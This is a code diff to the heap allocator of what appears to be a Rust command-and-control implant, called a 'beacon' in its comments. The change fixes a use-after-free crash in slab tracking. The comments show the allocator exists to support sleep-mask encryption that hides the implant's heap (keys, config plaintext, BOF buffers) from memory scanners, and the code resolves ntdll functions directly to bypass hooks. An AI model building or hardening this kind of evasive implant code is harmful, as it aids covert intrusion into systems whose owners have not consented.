@@ -24,9 +24,15 @@ unsafe fn unlock_allocator() {
 const SLAB_SIZE: usize = 1 << 20;
 const ALIGN: usize = 16;
 /// Maximum number of slabs the allocator can track (for heap enumeration at
-/// sleep-mask time). 16 slabs × 1 MiB default = 16 MiB, well above a typical
-/// beacon's footprint (config + transport buffers + BOF scratch).
-pub(crate) const MAX_SLABS: usize = 16;
+/// sleep-mask time). 256 slabs × 1 MiB default = 256 MiB — generous headroom
+/// for long-running beacons (screenshots, BOFs, downloads). The static table
+/// itself is small (256 × sizeof(SlabDesc) = 256 × 16 = 4 KiB).
+///
+/// NOTE: when this table fills we do NOT evict or free any slab. See the
+/// "no eviction" note on `track_slab` — freeing a slab in a bump allocator
+/// with no per-allocation free-list is a use-after-free. Past MAX_SLABS we
+/// simply fail the allocation (return null) rather than free.
+pub(crate) const MAX_SLABS: usize = 256;
 
 static NT_ALLOC: AtomicU64 = AtomicU64::new(0);
 static RESOLVED: AtomicBool = AtomicBool::new(false);
@@ -42,14 +48,32 @@ struct SlabDesc {
     len: u64,
 }
 
-/// All slabs ever allocated (bump-only, never reclaimed).
+/// Tracked slabs. Bump-allocated; tracked for the lifetime of the beacon so
+/// `enumerate_slabs()` can mask every live heap page during sleep. The table
+/// is never shrunk by eviction (see "no eviction" note on `track_slab`).
 static mut SLAB_TABLE: [SlabDesc; MAX_SLABS] = [SlabDesc { base: 0, len: 0 }; MAX_SLABS];
 static mut SLAB_COUNT: usize = 0;
 
 /// Record a newly allocated slab in the tracking table.
 /// Called from `new_slab_min` after a successful NtAllocateVirtualMemory.
 /// The caller MUST hold `ALLOC_LOCK`.
-unsafe fn track_slab(base: *mut u8, committed: usize) {
+///
+/// NO EVICTION / NO FREE: if the table is full (SLAB_COUNT == MAX_SLABS) we do
+/// NOT free any slab to make room. This is deliberate. The bump allocator has
+/// no per-allocation free-list (`dealloc` is a no-op), so any slab we picked to
+/// evict would still hold LIVE allocations — ECDH key copies, config plaintext,
+/// BOF buffers, etc. Releasing such a slab via NtFreeVirtualMemory(MEM_RELEASE)
+/// unmaps those pages while `mem::REGIONS` and other consumers still hold
+/// pointers into them; the next write (e.g. `mem::mask()` RC4) dereferences
+/// unmapped memory → ACCESS_VIOLATION. (Regression: a prior leak fix added the
+/// eviction+free path and any beacon allocating past MAX_SLABS × SLAB_SIZE
+/// crashed.) We accept a bounded leak instead: at 256 slabs × 1 MiB = 256 MiB
+/// the table effectively never fills in practice, and if it ever does the
+/// allocation simply fails (returns null) rather than corrupting the heap.
+/// Every tracked slab stays mapped and stays masked at sleep — no disclosure
+/// window. If real reclamation is ever needed, it requires a real free-list,
+/// not slab-granular release.
+unsafe fn track_slab(base: *mut u8, committed: usize) -> bool {
     let idx = SLAB_COUNT;
     if idx < MAX_SLABS {
         SLAB_TABLE[idx] = SlabDesc {
@@ -57,17 +81,15 @@ unsafe fn track_slab(base: *mut u8, committed: usize) {
             len: committed as u64,
         };
         SLAB_COUNT = idx + 1;
+        true
     } else {
-        // Slab table full — shift entries left (drop oldest), insert at end.
-        // This keeps tracking alive instead of silently losing slab info.
-        crate::entry::diag_mark(b"ERR_SLAB_OVERFLOW_SHIFT");
-        for i in 1..MAX_SLABS {
-            SLAB_TABLE[i - 1] = SLAB_TABLE[i];
-        }
-        SLAB_TABLE[MAX_SLABS - 1] = SlabDesc {
-            base: base as u64,
-            len: committed as u64,
-        };
+        // Slab table full — DO NOT evict/free (see the UAF note above). Mark
+        // it so the beacon can observe the condition, then signal failure so
+        // the caller (new_slab_min) fails the allocation gracefully (returns
+        // null → alloc returns null). This is the safe degradation: bounded
+        // leak, no dangling ptrs.
+        crate::entry::diag_mark(b"WARN_SLAB_TABLE_FULL");
+        false
     }
 }
 
@@ -146,8 +168,25 @@ unsafe fn new_slab_min(min_size: usize) -> *mut u8 {
     if status < 0 || base.is_null() {
         return core::ptr::null_mut();
     }
-    // Track the slab for heap enumeration at sleep-mask time.
-    track_slab(base as *mut u8, size);
+    // Track the slab for heap enumeration at sleep-mask time. If the table is
+    // full, track_slab returns false — we MUST NOT hand out this region, since
+    // it would be untracked and therefore unmasked at sleep (disclosure window)
+    // AND there is no safe eviction path (UAF, see track_slab). Fail closed:
+    // release the region we just allocated and return null so alloc degrades.
+    if !track_slab(base as *mut u8, size) {
+        // Best-effort release of the untracked region — safe here because
+        // nothing else has a pointer into it yet (we never bumped inside it).
+        let free_addr = crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory");
+        if let Some(addr) = free_addr {
+            type NtFree = unsafe extern "system" fn(usize, *mut *mut core::ffi::c_void, *mut usize, u32) -> i32;
+            let nt_free: NtFree = core::mem::transmute(addr);
+            let mut addr_arg: *mut core::ffi::c_void = base as *mut core::ffi::c_void;
+            let mut region_size: usize = 0;
+            nt_free(!0usize, &mut addr_arg, &mut region_size, 0x8000);
+        }
+        crate::entry::diag_mark(b"WARN_SLAB_UNTRACKED_RELEASED");
+        return core::ptr::null_mut();
+    }
     base as *mut u8
 }
 
@@ -266,5 +305,11 @@ unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
             }
         }
     }
+    // Intentional no-op: this is a bump allocator with no per-allocation
+    // free-list (infeasible for no_std PIC). Reclamation is NOT done by slab
+    // eviction either — freeing a slab that still holds live allocations is a
+    // use-after-free (see the "NO EVICTION / NO FREE" note on `track_slab`).
+    // We accept a bounded leak; total live memory is bounded by
+    // MAX_SLABS × SLAB_SIZE = 256 MiB.
     unsafe fn dealloc(&self, _ptr: *mut u8, _layout: core::alloc::Layout) {}
 }
